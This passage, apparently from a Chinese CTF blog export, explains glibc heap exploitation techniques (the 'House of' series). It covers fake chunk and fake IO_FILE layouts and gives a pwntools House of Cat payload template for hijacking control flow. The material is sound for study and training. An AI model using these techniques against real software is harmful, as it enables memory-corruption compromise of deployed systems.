wide_data->vtable+0x18==_IO_WOVERFLOW\n```\n\n可以看到这个过程通过将`fp`传入寄存器`rdi`，并通过对寄存器`rdi`进行操作，从中取出`wide_data中的_IO_write_ptr`和`wide_data中的vtable`，最后调用`vtable中的_IO_WOVERFLOW`。\n\n可以看到`wide_data中的_IO_write_ptr`被放入`rdx`，`wide_data中的vtable`被放入`rax`，通过` call   qword ptr [rax + 0x18] `调用`_IO_WOVERFLOW`，而这个`vtable`也是通过`rdi`的偏移再间址访问再偏移取得的。由于`IO_FILE`结构已经被我们劫持，因此寄存器`rdi`中的值是我们伪造的`IO_FILE`，是可以被我们所控制的，因此`rdx`和`rax`都是可以被我们控制的，所以**除了可以控制`rax`为伪造的`_IO_WOVERFLOW`之外，我们还可以控制寄存器`rdx`**。\n\n这样我们就可以**利用`setcontext`来控制程序流程**了，后面无论是走`ROP的orw`还是走`shellcode的orw`都可以得到flag了。\n\n`House of Cat`的模板如下：（具体情况还需要调试修改）\n\n```py\nfake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址\nnext_chain = 0\nfake_IO_FILE=p64(rdi)         #_flags=rdi\nfake_IO_FILE+=p64(0)*7\nfake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)\nfake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=伪造rdx的值 \nfake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)\nfake_IO_FILE = fake_IO_FILE.ljust(0x68, '\\x00')\nfake_IO_FILE += p64(0)  # _chain\nfake_IO_FILE = fake_IO_FILE.ljust(0x88, '\\x00')\nfake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address\nfake_IO_FILE = fake_IO_FILE.ljust(0xa0, '\\x00')\nfake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr\nfake_IO_FILE = fake_IO_FILE.ljust(0xc0, '\\x00')\nfake_IO_FILE += p64(1) #mode=1\nfake_IO_FILE = fake_IO_FILE.ljust(0xd8, '\\x00')\nfake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10 or ...\nfake_IO_FILE +=p64(0)*6\nfake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr,wide_data->vtable\n```\n\n### House of Kiwi\n\nhttps://www.anquanke.com/post/id/235598\n","source":"_posts/House Of XXX.md","raw":"---\ntitle: House of XXX\ndate: 2023-01-02 00:01:30\ncategories: \n- pwn\ntags: \n- pwn\n- heap \n- house_of_xxx\n---\n堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。\n<!--more-->\n\n### House of Spirit\n\nHouse of Spirit是一种针对fast bin的利用，通过在目标位置**伪造**fastbin chunk，并让其被释放，从而达到**申请指定地址内存**的目的。\n\n需要做的就是让目标位置能够被当作一个chunk释放，重点在于**修改指定地址前后的内容使其能绕过free的检测**。\n\n需要的绕过：\n\n- fake chunk的**ISMMAP位不能为1**，因为 free 时，如果是mmap的chunk，会单独处理。\n- fake chunk**地址需要对齐**。\n- fake chunk的**size大小需要满足对应的fastbin** 的需求，同时也得**对齐**。\n- fake chunk的next chunk的大小**不能小于2 * SIZE_SZ**，同时也**不能大于av->system_mem** 。\n- fake chunk对应的fastbin**链表头部不能是该fake chunk**，即不能构成double free的情况。\n\n### House of Force\n\nHouse of Force是一种针对**top chunk**的利用，当bin中所有的free chunk都不能满足需求时，就会从top chunk中切割，只要切割后top chunk size> MINSIZE，那么就可以切割top chunk分配。\n\n如果我们能通过一些方法**控制top chunk的size和我们申请的chunk的大小**，那么只要将**top chunk size修改为一个足够大的值**(如-1,unsigned long的最大值)，那么无论多大的size，我们都能分配到，由此实现**任意地址分配**。\n\n利用条件：\n\n- 可以控制top chunk的size\n- 可以控制申请chunk的大小\n\n### House of Einherjar\n\nHouse of Einherjar是一种针对**后向合并**操作的利用。当一个chunk被释放时，free会首先会利用prev_inuse位检查其物理低地址的chunk是否空闲，如果空闲则会将这两个chunk合并，**利用当前chunk P的指针、prev_size字段和size字段得到新的chunk的地址以及其大小**。\n\n因此如果我们能**控制prev_size字段和prev_inuse位**，那么我们就可以将新的chunk指向几乎任何位置。而堆溢出、off by one(null)都可以达到这个条件。\n\n值得注意的是，在合并取出前一个chunk的时候会用到**unlink**，因此需要提前构造好fake chunk来绕过unlink的检查。\n\n在这里unlink的检查中主要要注意的是：\n\n```c\n//检查prev_size和size是否一致\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \n      malloc_printerr (\"corrupted size vs. prev_size\");     \n\n//检查fd和bk\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \n\n```\n\n由于unlink中是利用要取出的chunk P进行验证，因此之后构造fake chunk的next chunk的prev_size即可绕过第一个检查。\n\n不过无论什么情况，第二个检查则需要构造一下。\n\n在利用unlink的时候，我们的绕过方式是：\n\n```c\n*(fakeFD+0x18)==P==*(fakeBK+0x10)\n//等价于(64bit)\nP->fd=&P-0x18\nP->bk=&P-0x10\n```\n\n但在这里我们可能不能获取到P的地址，所以我们换个方式:\n\n```c\nP->fd=P\nP->bk=P\n```\n\n同样可以绕过unlink的检查。\n\n值得注意的地方：\n\n- 需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。\n- 我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。\n- 我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。\n\n### House of Lore\n\nHouse of Lore好像没什么例子，可能比较少见吧。House of Lore可以实现分配任意指定位置的chunk，从而修改任意地址的内存。利用的前提是需要**控制Small Bin Chunk的bk指针**，并且**控制指定位置chunk的fd指针**。\n\n主要利用的是small bin中的漏洞。\n\n```c\n// 获取 small bin 中倒数第二个 chunk 。\nbck = victim->bk;\n// 检查 bck->fd 是不是 victim，防止伪造\nif (__glibc_unlikely(bck->fd != victim)) {\n  errstr = \"malloc(): smallbin double linked list corrupted\";\n  goto errout;\n  \n// 设置 victim 对应的 inuse 位\nset_inuse_bit_at_offset(victim, nb);\n// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来\nbin->bk = bck;\nbck->fd = bin;\n```\n\n当malloc的时候，如果申请的范围在small bin chunk内，且需要从small bin获取空闲的chunk时，会执行上面的语句。我们可以发现，如果我们能控制一个small bin chunk的bk指针指向fake chunk，并控制**fake chunk的fd指向该small bin chunk**来绕过检查，那么就可以将这个fake chunk放入small bin，下一次申请就可以申请到fake chunk1。\n\n### House of Orange\n\nHouse of Orange核心就是**通过漏洞利用获得free的效果**（在没有free的程序中）。\n\n原理是当前堆的**top chunk尺寸不足**以满足申请分配的大小的时候，**原来的top chunk会被释放并被置入unsorted bin中**，通过这一点可以在没有free函数情况下获取到 unsorted bins。此时会**执行sysmalloc来向系统申请更多的空间**。但是对于堆来说有mmap和brk两种分配方式，我们需要**让堆以brk的形式拓展**，之后原有的top chunk会被置于unsorted bin中。\n\n为了达到目的，我们伪造top chunk size绕过一些检查。\n\n- 伪造的 size 必须要对齐到内存页(0x1000)\n- size 要大于 MINSIZE(0x10)\n- size 要小于之后申请的 chunk size + MINSIZE(0x10)\n- size 的 prev inuse 位必须为 1\n\n当然malloc申请的size也有要求：malloc 的尺寸不能大于mmp_.mmap_threshold（默认128K）\n\ntop chunk size的对齐，top chunk addr + top chunk size后是一个4K对齐的地址（默认页面大小为4K，以4K对齐），因此伪造的top chunk size也要满足此条件，因此只能在原来的基础上增减4K的倍数。\n\nHouse of Orange的进一步利用与IO_FILE有关，后续再说。\n\n### House of Roman\n\nHouse of Roman是fast bin attack和unsorted bin attack的结合。该技术用于bypass ALSR（即使有PIE也依旧有效），利用12-bit的爆破来达到获取shell的目的。且仅仅只需要**一个UAF漏洞以及能创建任意大小的chunk**的情况下就能完成利用。常用在没有泄露的程序中。\n\n主要步骤为：\n\n1. 利用unsorted bin进行低地址覆盖，利用fastbin attack将fd指向malloc_hook-0x23来获取__malloc_hook（爆破）\n\n2. 利用unsorted bin attack修改malloc_hook为main_arena\n\n3. 利用之前获得的malloc_hook进行低位覆盖，修改malloc_hook为one_gadget\n\n### House of Rabbit\n\n一种在fast bin中伪造堆块的技术。其利用的是在进行malloc_consolidate时，fast bin中的堆块合并的过程中没有检查size。\n\n在chunk释放后，通过修改size构造fake chunk或修改fd指向fake chunk，之后通过malloc一个很大的内存，触发malloc_consolidate，由于这个过程中没有对size进行检查，因此fast bin中的chunk会放到对应的small bin中，伪造的fake chunk就变得合法了，由此可以实现overlapping\n\n不过需要伪造一下next chunk的prev_inuse=1和next next chunk的prev_inuse=1。\n\n### House of Corrosion\n\nHouse of Corrosion利用了**`global_max_fast`**这个libc中的全局变量，`global_max_fast`表示最大的fastbin chunk的大小，默认为`0x80`，在没有初始化堆的情况下为`0`。改写`globla_max_fast`可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。\n\n`fastbinsY`中有10个元素，存放大小从`0x20~0xb0`的chunk，当超出该范围的chunk进入`fastbinsY`时，就会发生**数组越界**。利用此方法我们可以向`fastbinsY`后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。\n\n偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。\n\n1. `free`的利用：\n\n    利用`free`将`chunk`放入`fastbinsY`时的数组越界。当`global_max_fast`被修改变大后，更大的`chunk`被视为`fast bin chunk`，会被放入`fastbinsY`，如果大小超出`0xb0`，就会将后面对应的内存视作`fastbinsY`的一项放入，表现出的结果就是**将释放的`chunk`的堆地址写入该内存**。\n\n    值得注意的是，本质上这次写入是`fast bin chunk`进入`fast bin`的结果，因此该`chunk`的**`fd`位置会保存该内存处原有的指针，`chunk`的内容会被清空**。\n\n2. `malloc`的利用：\n\n    `malloc`时更大的`chunk`被视作`fast bin`，因此首先在`fastbinsY`中对应的`fast bin`中取出`chunk`，如果大小超出`0xb0`，自然就会越界，在后面的内存中取出`chunk`。取出时，会**判断后面内存中指针对应的`chunk`的`size`字段是否符合该`fast bin`的大小，如果符合则可以取出**。\n\n### House of  Storm\n\nHouse_of_storm 可以**在任意地址写出chunk地址,进而把这个地址的高位当作size,可以进行任意地址分配chunk**，也就是可以造成任意地址写。House_of_storm 虽然危害之大，但是其条件也是非常的苛刻。\n\n条件：\n\n1. glibc版本小于2.30,因为2.30之后加入了检查\n2. 需要攻击者在 large_bin 和 unsorted_bin 中分别布置一个chunk 这两个chunk需要在**归位之后处于同一个 largebin 的index中且 unsorted_bin 中的chunk要比 large_bin 中的大**\n3. unsorted bin中的bk指针要可控\n4. large bin中的bk和bk_nextsize指针要可控\n\n漏洞发生在unsorted bin chunk放入large bin的过程中。\n\n```c\n//unsorted bin attack\n//我们控制unsorted_chunk->bk = fake_chunk\n\n//unsorted_chunks(av)->bk = fake_chunk\nunsorted_chunks(av)->bk = unsorted_chunk->bk;\n//fake_chunk+0x10 = unsorted_bin\nbck->fd = unsorted_chunks(av);\n\n//放入fast bin的过程中\n            else \n            {\n                /*\n                \t如果unsorted_chunk->size 大于 largbin_chunk->size，\n                \t把unsorted_chunk加入到纵向链表中\n                \t我们控制\n                \tlarge_chunk->bk = fake_chunk+0x8 \n                \tlarge_chunk->bk_nextsize=fake_chunk-0x18-5\t\n                  -5是因为堆地址常常是0x55或者0x56开头的，-5后可以将其写入size位，而0x56的size可以绕过malloc的检查申请出来\n                */\n                \n                 \n                unsorted_chunk->fd_nextsize = largbin_chunk;\n                \n                //unsorted_chunk->bk_nextsize = fake_chunk-0x18-5\n                unsorted_chunk->bk_nextsize = largbin_chunk->bk_nextsize;\n                \n                largbin_chunk->bk_nextsize = unsorted_chunk;\n                \n                //fake_chunk+0x3 = unsorted_chunk\n                unsorted_chunk->bk_nextsize->fd_nextsize = unsorted_chunk;\n            }\n            //bck  = fake_chunk+0x8\n            bck = largbin_chunk->bk;\n        }\n    } \n\nmark_bin(av, unsorted_chunk_index); //把unsorted_chunk加入到的bin的表示为非空\n//把unsorted_chunk加入到large bin的链表中\n\nunsorted_chunk->bk = bck;\nunsorted_chunk->fd = largbin_chunk;\nlargbin_chunk->bk = unsorted_chunk;\n//fake_chunk+0x18 = unsorted_chunk\nbck->fd = unsorted_chunk;\n```\n\n具体利用：\n\n1. 将unsorted bin chunk的bk指向为fake chunk\n2. 将large bin中的bk指针指向fake chunk+0x8，bk_nextsize指向fake chunk-0x18-5（如果target为要写入的目标地址，则fake chunk为target-0x20），来实现victim->bk_nextsize->fd_nextsize=victim(实现fake chunk+3=victim) \n3. 通过malloc(0x48)获得fake chunk,借此可以修改target处的内容\n\n```c\nunsorted_bin_chunk->bk=fake_chunk\nlarge_bin_chunk->bk=fake_chunk+0x8\nlarge_bin_chunk->bk_nextsize=fake_chunk-0x18-5\n```\n\n其原理相当于利用large bin将一个堆地址写入任意地址，通过堆地址高位的0x56绕过检测，并将该fake chunk链入unsorted bin，从而实现任意地址malloc。\n\n### House of Kiwi\n\n\n\n\n\n### House of Emma\n\n\n\n### House of Pig\n\nHouse of Pig 是一个将 Tcache Statsh Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。\n\n需要存在 UAF。能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回。\n\n利用流程为\n\n1. 进行一个 Tcache Stash Unlink+ 攻击，把地址 __free_hook - 0x10 写入 tcache_pthread_struct。由于该攻击要求__free_hook - 0x8 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。\n\n2. 再进行一个 large bin attack，修改 _IO_list_all 为一个堆地址，然后在该处伪造 _IO_FILE 结构体。\n\n3. 通过伪造的结构体触发 _IO_str_overflow getshell。\n\n### House of Banana\n\n从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了。不过large bin attack仍可以使用，然而从glibc 2.30开始，常规large bin attack方法也被封堵，不过也能使用。\n\n### House of  Apple\n\nHouse of Apple在仅使用一次`largebin attack`并限制读写次数的条件下进行`FSOP`利用，前提均是已经泄露出`libc`地址和`heap`地址。\n\n使用`house of apple`的条件为：\n\n1. 程序从`main`函数返回或能调用`exit`函数（触发调用链`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_OVERFLOW`)\n2. 能泄露出`heap`地址和`libc`地址\n3. 能使用一次`largebin attack`（FSOP劫持`_IO_list_all`到伪造的`IO_FILE`结构体)\n\n在劫持IO后我们仍可以继续利用某些`IO`流函数去修改其他地方的值。就离不开`IO_FILE`的一个成员`_wide_data`的利用，其在`IO_FILE`中的偏移是`0xa0`。通过对伪造`_wide_data`并将vtable修改为`_IO_wstrn_jumps`，通过exit函数触发调用链`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_OVERFLOW`，实现任意地址写已知（堆）地址（详情见IO_FILE）。\n\nHouse of Apple有四种利用思路：\n\n1. 修改tcache线程变量为已知值，控制tcache bin的分配。\n2. 修改`mp_.tcache_bins`为很大的值，使得很大的`chunk`也通过`tcachebin`去管理。\n3. 修改`tls`结构体`pointer_guard`的值为已知值，走House of emma。\n4. 修改`global_max_fast`全局变量，让大的chunk也能被认为是fast bin chunk。\n\n可以看到House of Apple主要还是利用`_wide_data`和`_IO_wstrn_jumps`中的`_IO_OVRFLOW`实现**任意地址写已知地址**，用以辅助其他方法劫持程序流。\n\n### House of  Apple2\n\nHouse of Apple2也是基于劫持`_wide_data`的利用，与House of Apple的区别在只劫持`_wide_data`的条件能控制程序的执行流。\n\n使用`house of apple2`的条件为：\n\n- 已知`heap`地址和`glibc`地址\n- 能控制程序执行`IO`操作，包括但不限于：从`main`函数返回、调用`exit`函数、通过`__malloc_assert`触发\n- 能控制`_IO_FILE`的`vtable`和`_wide_data`，一般使用`largebin attack`去控制\n\n这次主要利用的是`_IO_wide_data`中的`_wide_vtable`，这也是一个虚表，某些函数的执行会调用到其中的函数，调用过程如下：\n\n```c\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)\n \n#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)\n \n#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n \n#define _IO_WIDE_JUMPS(THIS) \\\n  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable\n```\n\n可以看到这里并**没有对vtable的合法性进行检测**。因此，我们可以劫持`IO_FILE`的`vtable`为`_IO_wfile_jumps`，控制`_wide_data`为可控的堆地址空间，进而控制`_wide_data->_wide_vtable`为可控的堆地址空间。控制程序执行`IO`流函数调用，最终调用到`_IO_Wxxxxx`函数即可控制程序的执行流。\n\n利用思路：\n\n目前在`glibc`源码中搜索到的`_IO_WXXXXX`系列函数的调用只有`_IO_WSETBUF`、`_IO_WUNDERFLOW`、`_IO_WDOALLOCATE`和`_IO_WOVERFLOW`。其中`_IO_WSETBUF`和`_IO_WUNDERFLOW`目前无法利用或利用困难，其余的均可构造合适的`_IO_FILE`进行利用。\n\n（1）利用`_IO_wfile_overflow`控制程序执行流（走`_IO_WDOALLOCATE`）\n\n以下利用的前提是要从`_IO_flush_all_lockp`执行`_IO_overflow(fp)`，因此伪造的IO_FILE需要满足以下条件：\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n调用链如下：\n\n```c\n_IO_wfile_overflow\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp->_wide_data->_wide_vtable + 0x68)(fp)\n```\n\n在`_IO_wfile_overflow`中需要绕过一些检测，使其成功调用`_IO_wdoallocbuf`。\n\n```c\nwint_t _IO_wfile_overflow (FILE *f, wint_t wch)\n{\n  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */\n    {\n      f->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return WEOF;\n    }\n  /* If currently reading or no buffer allocated. */\n  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)\n    {\n      /* Allocate a buffer if needed. */\n      if (f->_wide_data->_IO_write_base == 0)\n    {\n      _IO_wdoallocbuf (f);// 需要走到这里\n      // ......\n    }\n    }\n}\n```\n\n需要满足`_flags & _IO_NO_WRITES==0`，`_flags & _IO_CURRENTLY_PUTTING==0`和`_wide_data->_IO_write_base == 0`。\n\n在`_IO_wdoallocbuf`函数中需要使其调用\n\n```c\nvoid _IO_wdoallocbuf (FILE *fp)\n{\n  if (fp->_wide_data->_IO_buf_base)\n    return;\n  if (!(fp->_flags & _IO_UNBUFFERED))\n    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用，需要走到这里\n      return;\n  _IO_wsetb (fp, fp->_wide_data->_shortbuf,\n             fp->_wide_data->_shortbuf + 1, 0);\n}\nlibc_hidden_def (_IO_wdoallocbuf)\n```\n\n需要满足`_wide_data->_IO_buf_base==0`和`_flags & _IO_UNBUFFERED==0`。\n\n综上需要对伪造的IO_FILE进行一下设置：\n\n- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为`  sh;`，注意前面有两个空格\n- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可\n- `fp->_mode<=0`\n- `fp->_IO_write_ptr > fp->_IO_write_base`\n- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`\n- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`\n- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`\n- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`\n- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`\n\n（2）利用`_IO_wfile_underflow_mmap`控制程序执行流（走`_IO_WDOALLOCATE`）\n\n调用链如下：\n\n```c\n_IO_wfile_underflow_mmap\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp->_wide_data->_wide_vtable + 0x68)(fp)\n```\n\n在`_IO_wfile_underflow_mmap`中需要绕过一些检测，使其成功调用`_IO_wdoallocbuf`。\n\n```c\nstatic wint_t _IO_wfile_underflow_mmap (FILE *fp)\n{\n  struct _IO_codecvt *cd;\n  const char *read_stop;\n \n  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return WEOF;\n    }\n  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)\n    return *fp->_wide_data->_IO_read_ptr;\n \n  cd = fp->_codecvt;\n \n  /* Maybe there is something left in the external buffer.  */\n  if (fp->_IO_read_ptr >= fp->_IO_read_end\n      /* No.  But maybe the read buffer is not fully set up.  */\n      && _IO_file_underflow_mmap (fp) == EOF)\n    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error\n       flags as appropriate.  */\n    return WEOF;\n \n  /* There is more in the external.  Convert it.  */\n  read_stop = (const char *) fp->_IO_read_ptr;\n \n  if (fp->_wide_data->_IO_buf_base == NULL)\n    {\n      /* Maybe we already have a push back pointer.  */\n      if (fp->_wide_data->_IO_save_base != NULL)\n    {\n      free (fp->_wide_data->_IO_save_base);\n      fp->_flags &= ~_IO_IN_BACKUP;\n    }\n      _IO_wdoallocbuf (fp);// 需要走到这里\n    }\n    //......\n}\n```\n\n需要满足`_flags & _IO_NO_READS == 0`，`_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`和`_IO_read_ptr < _IO_read_end`绕过前面的return。设置`_wide_data->_IO_buf_base == NULL`和`_wide_data->_IO_save_base == NULL`调用`_IO_wdoallocbuf (fp)`。\n\n综上需要对伪造的IO_FILE进行一下设置：\n\n- `_flags`设置为`~4`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为`sh;`，注意前面有个空格\n- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可\n- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`\n- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`\n- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`\n- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`\n- `_wide_data->_IO_save_base`设置为`0`或者合法的可被`free`的地址，即满足`*(A + 0x40) = 0`\n- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`\n- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`\n\n（3）利用`_IO_wdefault_xsgetn`控制程序执行流（走`_IO_WOVERFLOW`）\n\n```c\n_IO_wdefault_xsgetn\n    __wunderflow\n        _IO_switch_to_wget_mode\n            _IO_WOVERFLOW\n                *(fp->_wide_data->_wide_vtable + 0x18)(fp)\n```\n\n在`_IO_wdefault_xsgetn`中需要绕过一些检测，使其成功调用`__wunderflow`。\n\n```c\nsize_t _IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)\n{\n  size_t more = n;\n  wchar_t *s = (wchar_t*) data;\n  for (;;)\n    {\n      /* Data available. */\n      ssize_t count = (fp->_wide_data->_IO_read_end\n                       - fp->_wide_data->_IO_read_ptr);\n      if (count > 0)\n    {\n      if ((size_t) count > more)\n        count = more;\n      if (count > 20)\n        {\n          s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);\n          fp->_wide_data->_IO_read_ptr += count;\n        }\n      else if (count <= 0)\n        count = 0;\n      else\n        {\n          wchar_t *p = fp->_wide_data->_IO_read_ptr;\n          int i = (int) count;\n          while (--i >= 0)\n        *s++ = *p++;\n          fp->_wide_data->_IO_read_ptr = p;\n            }\n            more -= count;\n        }\n      if (more == 0 || __wunderflow (fp) == WEOF) //进入这里\n    break;\n    }\n  return n - more;\n}\nlibc_hidden_def (_IO_wdefault_xsgetn)\n```\n\n需要满足`_wide_data->_IO_read_end - _wide_data->_IO_read_ptr== 0`不进入第一个if。之后需要`mode!=0`调用`__wunderflow(fp)`。\n\n之后要进入`_IO_switch_to_wget_mode`\n\n```c\nwint_t __wunderflow (FILE *fp)\n{\n  if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))\n    return WEOF;\n \n  if (fp->_mode == 0)\n    _IO_fwide (fp, 1);\n  if (_IO_in_put_mode (fp))\n    if (_IO_switch_to_wget_mode (fp) == EOF) //进入这里\n      return WEOF;\n    // ......\n}\n```\n\n需要满足`mode>0`（前面已经让mode!=0）绕过第一个if。之后需要`_flags & _IO_CURRENTLY_PUTTING != 0`，调用`_IO_switch_to_wget_mode`。\n\n最后真正进入`_IO_WXXXX`\n\n```c\nint _IO_switch_to_wget_mode (FILE *fp)\n{\n  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)\n    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里\n      return EOF;\n    // .....\n}\n```\n\n需要满足`_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`调用`_IO_WOVERFLOW`。\n\n综上需要对伪造的IO_FILE进行一下设置：\n\n- `_flags`设置为`0x800`\n- `vtable`设置为`_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps`地址（加减偏移），使其能成功调用`_IO_wdefault_xsgetn`即可\n- `_mode`设置为大于`0`，即满足`*(fp + 0xc0) > 0`\n- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`\n- `_wide_data->_IO_read_end == _wide_data->_IO_read_ptr`设置为`0`，即满足`*(A + 8) = *A`\n- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`，即满足`*(A + 0x20) > *(A + 0x18)`\n- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`\n- `_wide_data->_wide_vtable->overflow`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x18) = C`\n\n### House of Cat\n\nHouse of Cat利用了**_IO_wfile_jumps**中的**_IO_wfile_seekoff**函数，最后**_IO_switch_to_wget_mode**函数中来攻击，在**FSOP**的情况下也是可行的，只需修改虚表指针的偏移来调用**_IO_wfile_seekoff**即可（通常是结合**__malloc_assert**，改vtable为**_IO_wfile_jumps+0x10**）。\n\n调用链：`_IO_wfile_seekoff -> _IO_switch_to_wget_mode -> _IO_WOVERFLOW`\n\n`_IO_wfile_seekoff`如下：\n\n```c\noff64_t _IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)\n{\n  off64_t result;\n  off64_t delta, new_offset;\n  long int count;\n \n  if (mode == 0)\n    return do_ftell_wide (fp);\n  int must_be_exact = ((fp->_wide_data->_IO_read_base\n            == fp->_wide_data->_IO_read_end)\n               && (fp->_wide_data->_IO_write_base\n               == fp->_wide_data->_IO_write_ptr));\n#需要绕过was_writing的检测\n  bool was_writing = ((fp->_wide_data->_IO_write_ptr\n               > fp->_wide_data->_IO_write_base)\n              || _IO_in_put_mode (fp));\n \n  if (was_writing && _IO_switch_to_wget_mode (fp)) //进入_IO_switch_to_wget_mode\n    return WEOF;\n......\n}\n```\n\n`_IO_switch_to_wget_mode`如下：\n\n```c\nint _IO_switch_to_wget_mode (FILE *fp)\n{\n  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)\n    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里\n      return EOF;\n    // .....\n}\n```\n\n如果要利用`_IO_WOVERFLOW`，我们将其设置为`system`或者`one_gadget`，调用到这里就可以`get shell`。不过如果遇到了**开启沙箱**的情况，这种方法就不可行了，我们就要考虑其他方式。\n\n先看看`_IO_switch_to_wget_mode`调用`_IO_WOVERFLOW`的汇编代码：\n\n```asm\n0x7f4cae745d34 <_IO_switch_to_wget_mode+4>     mov    rax, qword ptr [rdi + 0xa0] \n;rdi==fp\n;rax=fp+0xa0==wide_data\n0x7f4cae745d3f <_IO_switch_to_wget_mode+15>    mov    rdx, qword ptr [rax + 0x20]\n;rdx=wide_data->_IO_write_ptr\n0x7f4cae745d49 <_IO_switch_to_wget_mode+25>    mov    rax, qword ptr [rax + 0xe0] ;rax=wide_data+0xe0==wide_data->vtable\n0x7f4cae745d55 <_IO_switch_to_wget_mode+37>    call   qword ptr [rax + 0x18] \n;call wide_data->vtable+0x18==_IO_WOVERFLOW\n```\n\n可以看到这个过程通过将`fp`传入寄存器`rdi`，并通过对寄存器`rdi`进行操作，从中取出`wide_data中的_IO_write_ptr`和`wide_data中的vtable`，最后调用`vtable中的_IO_WOVERFLOW`。\n\n可以看到`wide_data中的_IO_write_ptr`被放入`rdx`，`wide_data中的vtable`被放入`rax`，通过` call   qword ptr [rax + 0x18] 